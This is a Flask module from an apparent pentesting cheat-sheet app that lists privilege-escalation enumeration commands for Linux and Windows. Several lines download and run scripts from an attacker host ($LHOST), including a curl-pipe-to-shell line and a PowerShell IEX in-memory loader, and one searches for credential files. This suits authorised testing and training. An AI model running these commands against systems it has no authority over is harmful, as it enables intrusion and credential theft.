from flask import Blueprint, render_template

bp = Blueprint("privesc_auto", __name__)

CARDS = [
    {"title": "Linux — linPEAS", "hint": "The all-in-one enumerator. Run first.", "blocks": [
        {"tpl": "curl -L http://$LHOST/linpeas.sh | sh", "lbl": "run in memory (no disk)"},
        {"tpl": "wget http://$LHOST/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh"},
        {"tpl": "./linpeas.sh -a > lp.txt 2>&1", "lbl": "full/verbose to file"},
        {"tpl": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh", "lbl": "get latest"},
    ]},
    {"title": "Linux — pspy (no root needed)", "hint": "Watch cron/processes to catch running-as-root tasks.", "blocks": [
        {"tpl": "./pspy64 -pf -i 1000", "lbl": "procs + files, 1s interval"},
        {"tpl": "wget http://$LHOST/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy"},
        {"tpl": "curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o pspy64", "lbl": "get latest"},
    ]},
    {"title": "Linux — other enum", "blocks": [
        {"tpl": "./LinEnum.sh -t"},
        {"tpl": "./lse.sh -l 1", "lbl": "linux-smart-enumeration"},
        {"tpl": "sudo -l", "lbl": "check sudo rights (GTFOBins)"},
        {"tpl": "find / -perm -4000 -type f 2>/dev/null", "lbl": "SUID binaries"},
        {"tpl": "getcap -r / 2>/dev/null", "lbl": "capabilities"},
    ]},
    {"title": "Windows — winPEAS", "blocks": [
        {"tpl": "winPEASx64.exe", "lbl": "full"},
        {"tpl": "winPEASany.exe quiet cmd fast", "lbl": ".NET-agnostic, quick"},
        {"tpl": "iwr http://$LHOST/winPEASx64.exe -o wp.exe; .\\wp.exe", "lbl": "download + run"},
        {"tpl": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o winPEAS.exe", "lbl": "get latest"},
    ]},
    {"title": "Windows — PowerUp / SharpUp", "hint": "PowerShell + C# quick-win finders.", "blocks": [
        {"tpl": "powershell -ep bypass -c \". .\\PowerUp.ps1; Invoke-AllChecks\""},
        {"tpl": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/PowerUp.ps1'); Invoke-AllChecks\"", "lbl": "in-memory"},
        {"tpl": "SharpUp.exe audit", "lbl": "C# version (audit all)"},
        {"tpl": "# PowerUp: Get-ModifiableServiceFile, Get-UnquotedService, Get-ModifiableService", "plain": True},
    ]},
    {"title": "Windows — other enum", "blocks": [
        {"tpl": "whoami /priv", "lbl": "token privileges (SeImpersonate -> Potato)"},
        {"tpl": "whoami /all", "lbl": "groups + SIDs"},
        {"tpl": "seatbelt.exe -group=all", "lbl": "Seatbelt host survey"},
        {"tpl": "systeminfo", "lbl": "patch level -> WES-NG / windows-exploit-suggester"},
        {"tpl": "powershell -c \"Get-ChildItem -Path C:\\ -Include *.kdbx,*.config,unattend.xml -Recurse -EA 0\"", "lbl": "cred files"},
    ]},
    {"title": "Serve the tools (from $LHOST)", "hint": "Host the PEAS/pspy binaries then pull them (see File transfer tab).", "blocks": [
        {"tpl": "python3 -m http.server 80", "lbl": "in the folder with linpeas.sh/winPEAS.exe/pspy64"},
    ]},
]


@bp.route("/privesc-auto")
def index():
    return render_template("cheat.html", active="privesc_auto",
                           title="Automation", tag="privesc",
                           intro="Automated privesc enumeration: linPEAS/pspy on Linux, winPEAS/PowerUp/SharpUp on Windows. Run these first, then chase the findings in the OS-specific tabs.",
                           cards=CARDS)


MODULE = {"id": "privesc_auto", "title": "Automation", "category": "Privilege Escalation",
          "order": 3, "blueprint": bp, "endpoint": "privesc_auto.index"}
